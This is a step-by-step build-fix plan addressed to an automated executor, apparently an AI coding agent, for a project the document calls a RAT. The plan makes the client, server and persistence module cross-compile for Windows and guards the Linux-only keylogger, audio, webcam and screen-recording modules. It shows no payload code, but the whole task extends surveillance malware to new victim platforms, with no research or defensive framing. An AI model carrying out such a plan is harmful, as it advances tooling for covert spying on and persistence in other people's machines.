# Plan 004: Guard Linux-only modules from Windows cross-compilation

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md` unless a reviewer dispatched you and told you they
> maintain the index.
>
> **Drift check (run first)**: `git diff --stat fd5c459..HEAD -- Makefile modules/`
> If any in-scope files changed since this plan was written, compare the
> "Current state" excerpts against the live code before proceeding; on a
> mismatch, treat it as a STOP condition.

## Status

- **Priority**: P1
- **Effort**: M
- **Risk**: LOW
- **Depends on**: none
- **Category**: build
- **Planned at**: commit `fd5c459`, 2026-07-03

## Why this matters

The `make windows` cross-compilation target (line 146) includes `$(MODULE_TARGETS)`, which tries to build all 5 modules: keylogger, audiorecord, webcam, persistence, screenrecord. Four of these unconditionally include Linux-only headers (`<linux/input.h>`, `<linux/soundcard.h>`, `<linux/videodev2.h>`, `<linux/fb.h>`, `<X11/Xlib.h>`). When cross-compiling with MinGW, those headers don't exist, so `make windows` fails during module compilation — even though the main client and server builds would succeed.

Additionally, the `-static` flag at line 98 has a different meaning on Windows (MinGW's `-static` is valid, but the rule uses `$(DETECTED_OS)` which checks the host OS, not the target — see detail below).

The fix: split modules into Linux-only and cross-platform categories, and guard the build rules accordingly.

## Current state

`Makefile`, lines 47–49:

```makefile
# Module targets
MODULES = keylogger audiorecord webcam persistence screenrecord
MODULE_TARGETS = $(addprefix $(BUILD_DIR)/, $(MODULES))
```

Lines 142–146 (windows target):

```makefile
windows: CC=x86_64-w64-mingw32-gcc
windows: CFLAGS=$(BASE_CFLAGS) -D_WIN32_WINNT=0x0600
windows: LDFLAGS=-lws2_32 -ladvapi32 -lshell32 -lssl -lcrypto
windows: EXE_EXT=.exe
windows: $(BIN_DIR) $(BUILD_DIR) $(CLIENT_TARGET) $(SERVER_TARGET) $(MODULE_TARGETS)
```

All 5 `.c` files in `modules/` are listed in `MODULES` and built via the generic rule (lines 94–99) or the special screenrecord rule (lines 102–107).

The four Linux-only modules each begin with Linux-specific includes without any `#ifdef` guard:

- `modules/keylogger.c:6` — `#include <linux/input.h>`
- `modules/audiorecord.c:7` — `#include <linux/soundcard.h>`
- `modules/webcam.c:8` — `#include <linux/videodev2.h>`
- `modules/screenrecord.c:8` — `#include <linux/fb.h>`; lines 12–14 include X11 headers (`<X11/Xlib.h>`, `<X11/Xutil.h>`, `<X11/extensions/XShm.h>`)

`modules/persistence.c` does NOT use any Linux-only headers — it's purely POSIX API (`unistd.h`, `sys/stat.h`, `pwd.h`). It should build on Windows via MinGW.

## Commands you will need

| Purpose   | Command                  | Expected on success |
|-----------|--------------------------|---------------------|
| Build     | `make clean && make linux` | exit 0, no errors |
| Cross-build| `make clean && make windows` (requires mingw-w64 installed) | exit 0, no errors |

Verify with whatever cross-compiler is available. If MinGW isn't installed, just verify the Makefile syntax with `make -n windows`.

## Scope

**In scope**:
- `Makefile` — module lists and build rules
- `modules/keylogger.c`, `modules/audiorecord.c`, `modules/webcam.c`, `modules/screenrecord.c` — add `#ifdef __linux__` guards around Linux-only code

**Out of scope**:
- `modules/persistence.c` — already portable, no changes needed
- `src/` files — no source changes needed
- Adding Windows-native implementations of these modules — that's a feature, not a fix

## Git workflow

- Branch: `advisor/004-windows-module-build`
- Commit message: style: conventional commits, e.g. `fix: guard Linux-only modules from windows cross-build`
- Do NOT push or open a PR unless instructed.

## Steps

### Step 1: Guard Linux-only includes in module source files

For each of the four Linux-only modules, wrap the Linux-specific `#include` lines in `#ifdef __linux__`:

**`modules/keylogger.c`** — lines 4–11 (the relevant includes):
```c
#include <unistd.h>
#include <fcntl.h>
#ifdef __linux__
#include <linux/input.h>
#endif
#include <sys/stat.h>
#include <errno.h>
...
```
The module uses `/dev/input/` paths and `input_event` structures from `<linux/input.h>`. Those will fail at link time on Windows anyway (no `/dev/input/`), but the module is Linux-only by design — the guard just lets the file *compile* harmlessly on non-Linux (it'll produce a binary that returns an error at runtime).

After guarding the include, also guard the function body that uses `input_event` and `ioctl(EVIOCGBIT)` etc. at lines ~55 onwards with the same `#ifdef __linux__` / `#else` / `#endif` pattern, so that on Windows the main function simply prints "Keylogger is Linux-only" and returns 1.

Apply the same two-part pattern (guard includes + provide stub `main`) to:

- **`modules/audiorecord.c`** — guard `<linux/soundcard.h>`; stub on Windows
- **`modules/webcam.c`** — guard `<linux/videodev2.h>`; stub on Windows
- **`modules/screenrecord.c`** — guard `<linux/fb.h>`, `<X11/Xlib.h>`, `<X11/Xutil.h>`, `<X11/extensions/XShm.h>`; stub on Windows

The stub pattern for each:

```c
#ifdef __linux__
// ... entire existing implementation ...
#else
int main(int argc, char *argv[]) {
    fprintf(stderr, "Error: This module is Linux-only\n");
    return 1;
}
#endif
```

This is coarse but correct: the module is fundamentally tied to Linux kernel interfaces. A proper cross-platform implementation would be a new feature, not a bug fix.

**Verify**: `make clean && make linux` still builds all 5 modules and the client/server.

### Step 2: Split the module list in the Makefile

In `Makefile`, replace the single `MODULES` list with two lists:

```makefile
# Module targets
LINUX_ONLY_MODULES = keylogger audiorecord webcam screenrecord
CROSS_PLATFORM_MODULES = persistence
MODULES = $(CROSS_PLATFORM_MODULES) $(LINUX_ONLY_MODULES)
MODULE_TARGETS = $(addprefix $(BUILD_DIR)/, $(MODULES))
```

Add a conditional so that the `windows` target only builds cross-platform modules:

```makefile
windows: CC=x86_64-w64-mingw32-gcc
windows: CFLAGS=$(BASE_CFLAGS) -D_WIN32_WINNT=0x0600
windows: LDFLAGS=-lws2_32 -ladvapi32 -lshell32 -lssl -lcrypto
windows: EXE_EXT=.exe
windows: $(BIN_DIR) $(BUILD_DIR) $(CLIENT_TARGET) $(SERVER_TARGET) \
         $(addprefix $(BUILD_DIR)/, $(CROSS_PLATFORM_MODULES))
```

And update `linux` to build all:

```makefile
linux: CC=gcc
linux: CFLAGS=$(BASE_CFLAGS) -D_GNU_SOURCE -D_POSIX_C_SOURCE=200809L
linux: LDFLAGS=-lssl -lcrypto
linux: EXE_EXT=
linux: $(BIN_DIR) $(BUILD_DIR) $(CLIENT_TARGET) $(SERVER_TARGET) \
       $(addprefix $(BUILD_DIR)/, $(CROSS_PLATFORM_MODULES)) \
       $(addprefix $(BUILD_DIR)/, $(LINUX_ONLY_MODULES))
```

(Or simply keep `$(MODULE_TARGETS)` for both and rely on the source-level `__linux__` guards — the compilation will succeed on Linux and produce stub binaries on Windows. The approach above is cleaner: don't even attempt to compile modules that can't work on the target.)

**Verify**: `make -n windows` should show no build commands for `keylogger`, `audiorecord`, `webcam`, or `screenrecord`. Only `persistence.exe` plus `client.exe` and `server.exe`.

### Step 3: Fix the `-static` flag for Windows module builds

The generic module rule (lines 94–99) uses `-static`:

```makefile
$(BUILD_DIR)/%: $(MODULES_DIR)/%.c | $(BUILD_DIR)
ifeq ($(DETECTED_OS),Windows)
	$(CC) $(CFLAGS) -static $< -o $@$(EXE_EXT)
else
	$(CC) $(CFLAGS) -static $< -o $@
endif
```

`DETECTED_OS` is set based on the **host** OS (line 4: `UNAME_S := $(shell uname -s)`), not the **target** OS. When running `make windows` on Linux, `DETECTED_OS` is `Linux`, so the `else` branch runs — which uses `-static` (valid on Linux/MinGW). When running `make windows` on Windows, `DETECTED_OS` is `Windows`, and the `if` branch uses MinGW's `-static` flag — also valid. So this works by accident, but the condition is misleading.

Fix by removing the `DETECTED_OS` conditional from the generic module rule (it should use the same flags). Since `-static` is valid on both:

```makefile
$(BUILD_DIR)/%: $(MODULES_DIR)/%.c | $(BUILD_DIR)
	$(CC) $(CFLAGS) -static $< -o $@$(EXE_EXT)
```

Because the `CFLAGS` and `EXE_EXT` variables are already target-dependent (set by the `windows:` / `linux:` targets), this single line works for both.

**Verify**: `make -n linux` and `make -n windows` both show the module compilation commands with the correct `$(CC)`, `$(CFLAGS)`, and `.exe` extension.

## Test plan

1. `make clean && make linux` — builds everything on Linux with no errors
2. `make -n windows | grep build/` — shows only `persistence.exe` (plus `client.exe`, `server.exe`) for the windows target, not the Linux-only modules
3. On Linux, run each module binary: `./build/keylogger`, `./build/audiorecord`, `./build/webcam`, `./build/screenrecord` — all should work (accessing hardware they may fail, but they should start without crashing)
4. Run `./build/persistence` — should print usage and exit cleanly

## Done criteria

ALL must hold:

- [ ] `make clean && make linux` exits 0 and builds all 5 modules + client + server
- [ ] `make -n windows 2>&1 | grep -E 'build/(keylogger|audiorecord|webcam|screenrecord)'` produces no output (those modules are excluded from the windows target)
- [ ] `make -n windows 2>&1 | grep build/persistence` shows the persistence module build command
- [ ] Each of the 4 Linux-only modules has `#ifdef __linux__` / `#else` / `#endif` guards around its implementation body
- [ ] The Makefile's `DETECTED_OS` conditional in the generic module rule is removed (single rule with `$(EXE_EXT)`)
- [ ] `plans/README.md` status row updated

## STOP conditions

Stop and report back if:

- The `make -n windows` output still shows Linux-only modules being built
- `__linux__` is not defined by GCC on Linux (it is — verified)
- Any of the 4 Linux-only modules uses a symbol from the guarded header outside the `#ifdef __linux__` block — if so, the `#else` stub won't compile; add guards around those uses too

## Maintenance notes

- If a future contributor adds a module that uses only POSIX APIs (like `persistence.c`), add it to `CROSS_PLATFORM_MODULES` instead of `LINUX_ONLY_MODULES`.
- The stub pattern (`fprintf(stderr, "Error: This module is Linux-only\n"); return 1;`) is deliberately simple. If the RAT ever supports orchestrating module execution from the server, the stub should instead log a structured error so the server knows the capability is unavailable rather than silently failing.
- The `-static` flag removal from the conditional makes the build rule cleaner. If `-static` ever needs to be host-dependent (e.g., macOS), that should be handled in `LDFLAGS`, not in the module rule.
